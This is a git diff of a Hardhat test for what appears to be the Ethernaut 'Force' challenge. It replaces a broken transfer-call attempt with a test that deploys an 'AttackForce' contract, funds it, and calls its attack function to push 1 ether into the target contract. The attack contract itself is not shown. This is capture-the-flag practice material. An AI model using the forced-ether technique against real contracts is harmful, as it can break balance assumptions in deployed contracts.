@@ -6,22 +6,27 @@ const { parseEther } = require("ethers/lib/utils");
 
 describe("test", function () {
     var Force;
+    var AttackForce;
     it("init params", async function () {
         [deployer, ...users] = await ethers.getSigners();
     });
     it("deploy", async function () {
         const ForceInstance = await ethers.getContractFactory("Force");
         Force = await ForceInstance.deploy();
+
+        const AttackForceInstance = await ethers.getContractFactory("AttackForce");
+        AttackForce = await AttackForceInstance.deploy();
     });
     it("hack test", async function () {
-        const abi = ["function transfer(address _to,unit _amount)"];
-        const interface = new ethers.utils.Interface(abi);
-
-        const callData = interface.encodeFunctionData(`transfer`, [Force.address, parseEther("1")]);
-        await users[0].sendTransaction({
-            to: Force.address,
-            data: callData,
+        await deployer.sendTransaction({
+            to: AttackForce.address,
+            value: parseEther("1"),
         });
-        expect(await Force.owner()).to.equal(users[0].address);
+        const balance1 = await ethers.provider.getBalance(AttackForce.address);
+
+        await AttackForce.attack(Force.address);
+        const balance2 = await ethers.provider.getBalance(Force.address);
+
+        expect(balance2).to.equal(parseEther("1"));
     });
 });
